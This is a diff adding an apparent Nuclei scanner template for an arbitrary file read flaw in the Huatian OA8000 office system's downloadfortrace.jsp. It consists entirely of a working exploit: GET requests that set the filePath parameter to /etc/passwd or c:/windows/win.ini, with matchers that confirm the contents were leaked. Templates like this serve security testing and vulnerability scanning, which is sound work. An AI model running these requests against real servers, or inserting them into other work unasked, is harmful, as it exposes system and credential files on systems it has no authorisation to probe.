@@ -1,0 +1,37 @@
+id: huatian-oa-downloadfortrace-fileread
+info:
+  name: 华天动力oa8000 downloadfortrace.jsp存在任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/main/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9B/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9Boa8000%20downloadfortrace.jsp%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,huatian,oa
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp?filePath=/etc/passwd"
+      - "{{BaseURL}}/OAapp/jsp/trace_eWebEditor/downloadfortrace.jsp?filePath=c:/windows/win.ini"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
